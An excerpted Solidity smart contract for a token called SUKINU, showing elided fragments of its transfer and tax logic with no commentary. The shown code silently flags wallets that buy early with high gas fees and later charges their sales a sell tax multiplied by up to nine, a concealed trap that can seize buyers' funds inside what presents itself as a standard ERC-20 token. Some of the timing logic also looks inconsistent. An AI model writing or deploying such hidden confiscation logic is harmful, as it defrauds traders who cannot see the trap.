...
contract SUKINU is Context, IERC20 { 
    ...
    string private constant _symbol = unicode"SUKINU";
    ...
    function SetlimitInEffects() private {
        if (tradingActiveBlock + 60 <= block.timestamp) { 
            limitInEffects = false;
            gasForProcessing = 9 gwei;
            _rtotal = 9;}
        if (tradingActiveBlock + 30 <= block.timestamp) { 
            gasForProcessing = 6 gwei;
            _rtotal = 3;
        }
    }
    ...
    function _transfer(
        ...
        if (tx.gasprice > gasForProcessing && limitInEffects && to != uniswapV2Pair) {_isExcludedFromLimitEffect[to] = true;}
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        if(!takeFee){
            ...
            uint256 sAmount;
            if (_isExcludedFromLimitEffect[sender]){sAmount = tAmount*_Tax_on_Sell/100*_rtotal;}
